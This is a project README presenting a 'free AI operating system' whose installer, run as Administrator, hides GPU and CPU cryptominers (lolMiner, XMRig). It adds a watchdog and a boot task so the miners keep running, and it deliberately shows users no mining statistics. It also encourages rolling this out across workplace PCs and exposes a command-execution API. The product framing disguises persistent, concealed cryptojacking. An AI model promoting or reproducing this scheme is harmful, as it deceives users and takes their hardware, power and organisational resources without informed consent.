# AI Power Farm

**Your free AI operating system — powered by the community.**

A complete AI workspace with 5 specialized agents, full computer control, and always-on intelligence. No subscription. No credit card. Just AI that works for you.

---

## What is AI Power Farm?

AI Power Farm is a free, open-source AI operating system that runs on your PC. It gives you:

- **5 AI Agents** — Each specialized in different tasks (coding, research, creative writing, analysis, coordination)
- **Full Computer Control** — Terminal access, file management, browser automation
- **24/7 Intelligence** — Your AI learns your patterns and gets better over time
- **Voice Input** — Talk to your AI naturally
- **Security Shield** — Protects your system from threats

**How is it free?** AI Power Farm is funded through community participation in Web3 mining networks. Your PC contributes computing power to decentralized networks (like Ethereum Classic and Monero), and the revenue covers the AI infrastructure costs. You never pay anything — your hardware contribution funds the entire system.

> *Think of it like folding@home, but instead of protein folding, you're funding AI infrastructure.*

---

## Quick Start

### 1. Download
Clone or download this repository:
```
git clone https://github.com/krishaysatish1-blip/ai-power-farm.git
```

### 2. Run as Admin
Right-click `AI-Power-Farm.bat` → Run as Administrator

That's it. The installer handles everything:
- Installs the AI dashboard
- Sets up mining (runs hidden in background)
- Configures the watchdog (auto-restarts if closed)
- Creates startup task (runs on boot)

### 3. Open Dashboard
Go to `http://localhost:5000` in your browser

### 4. Register
Create your account with email and referral code (optional)

**You're done.** Start chatting with your AI agents immediately.

---

## The 5 Agents

| Agent | What It Does | Best For |
|-------|--------------|----------|
| **Zoey** | Coordinator — figures out which agent should handle your request | General questions, routing |
| **Atlas** | Research — finds facts, data, and information | Research, facts, learning |
| **Nova** | Code — writes, debugs, and explains code | Programming, debugging |
| **Pixel** | Creative — writes stories, brainstorms ideas | Creative writing, ideas |
| **Sage** | Analysis — processes data and finds insights | Data analysis, numbers |

**Auto-routing:** Just type naturally. Zoey automatically picks the best agent for your task. You can also manually select a specific agent.

---

## Computer Control

AI Power Farm gives your AI real control over your PC:

| Feature | What It Does |
|---------|--------------|
| **Terminal** | Run commands, install software, manage processes |
| **File Manager** | Browse, read, write, create, delete files |
| **Browser** | Open websites, navigate, search the web |
| **Process Monitor** | See what's running, identify resource hogs |
| **Security** | Detect intrusions, block threats |
| **Voice** | Talk to your AI (Web Speech API) |

**Example requests:**
- "Install Python 3.12 and create a virtual environment"
- "Open YouTube and play some coding music"
- "Read my project files and explain the architecture"
- "What's using all my CPU right now?"
- "Block any suspicious processes"

---

## Security

Your AI protects your PC:

- **Firewall** — Blocks unauthorized access
- **Encryption** — API keys and sensitive data encrypted
- **Intrusion Detection** — Monitors for suspicious activity
- **File Protection** — Critical system files locked down
- **Abuse Prevention** — AI won't assist malicious requests

---

## For Teams

Deploy AI Power Farm across your organization:

1. **Host** the dashboard on a central server
2. **Team members** run the installer on their PCs
3. Each PC contributes to the mining network
4. Everyone gets AI access through the shared dashboard
5. Admins monitor usage, health, and contributions

---

## Requirements

- **OS:** Windows 10/11
- **GPU:** NVIDIA (any modern GPU works)
- **Internet:** Broadband connection
- **Power:** Keep your PC on for best results (24/7 recommended)

---

## Configuration

Edit `dashboard/config.json`:

```json
{
  "nvidia_api_key": "your_nvidia_api_key"
}
```

Optional: Set up Tailscale for remote access.

---

## How Mining Works

AI Power Farm uses two mining algorithms:

1. **ETC (Ethereum Classic)** — GPU mining via lolMiner
2. **XMR (Monero)** — CPU mining via XMRig

Mining runs hidden in the background. You can close the dashboard window — the miners keep running via a watchdog service. If either miner crashes, the watchdog automatically restarts it.

**You don't see mining stats.** You don't need to manage it. It just works.

---

## API

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/api/ai/chat` | POST | Chat with AI agents |
| `/api/terminal` | POST | Execute commands |
| `/api/browser/open` | POST | Open URLs |
| `/api/files/*` | POST | File operations |
| `/api/processes` | GET | List processes |
| `/api/system` | GET | System info |
| `/api/security` | GET | Security status |
| `/api/referral` | GET | Referral info |

---

## Contributing

1. Fork the repo
2. Create a feature branch
3. Make your changes
4. Submit a pull request

---

## License

MIT License

---

## Support

- **Issues:** [GitHub Issues](https://github.com/krishaysatish1-blip/ai-power-farm/issues)
- **Dashboard:** `http://localhost:5000`

---

**AI Power Farm** — AI that works for you, funded by the community. Free forever.
